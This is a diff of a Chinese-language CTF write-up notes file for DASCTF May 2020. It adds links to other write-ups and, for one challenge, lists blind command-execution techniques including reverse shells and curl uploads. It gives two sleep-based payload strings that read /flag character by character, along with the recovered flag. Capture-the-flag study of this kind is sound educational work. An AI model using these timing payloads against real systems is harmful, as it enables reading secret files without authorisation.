@@ -5,6 +5,8 @@
 > 任务描述：2020年DASCTF五月线上赛
 >
 > 进行时间：2020-5-22 11:00 -- 2020-5-23 23:00 晚上暂停
+>
+> 官方writeup收集：https://shimo.im/docs/DRgjXTH3cJjrHKcw
 
 
 
@@ -19,6 +21,28 @@
 > hint1：防火墙
 >
 > 183.129.189.60:10069,10070,10071,10072,10073,10074
+
+其他writeup:
+
+- https://www.cnblogs.com/h3zh1/p/12945275.html
+
+无回显命令执行，主要有这几个方法：DNSLOG、curl上传文件、反弹shell、sleep盲注
+
+经过测试sleep可用，然后只需要拼出可用的shell命令就行了
+
+```python
+# 上面writeup中的
+playload = '''h3zh1=$( cat /flag | cut -c %d-%d );if [ $( printf '%%d' "'$h3zh1" ) -gt %d ];then sleep %f;fi''' % ( i, i, mid, SLEEP_TIME)
+
+# 下面我用的
+# 直接${flag:0:1}截取字符不好使，这里变通了一下使用${flag#fl}和${#lll}通过截取字符串判断长度
+# lll是模糊截取后面的字符串，i从大到小，当sleep 3时，字符c就在倒数第i位上
+playload = 'fflag=`cat /flag`;lll=${fflag#*s_great*%s};if [ ${#lll} -ge %d ];then sleep 3;fi'%(c,i)
+```
+
+```
+BJD{make_iptables_great_again}
+```
 
 
 
@@ -339,6 +363,11 @@ m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~
 > hint2: 用df命令看看硬盘总共多大，再看看flag多大。
 >
 > 183.129.189.60:10118,10119,10120,10121,10122,10123
+
+其他writeup:
+
+- https://ytoworld.tk/index.php/archives/100/#testyournc
+- https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/#testyournc
 
 
 
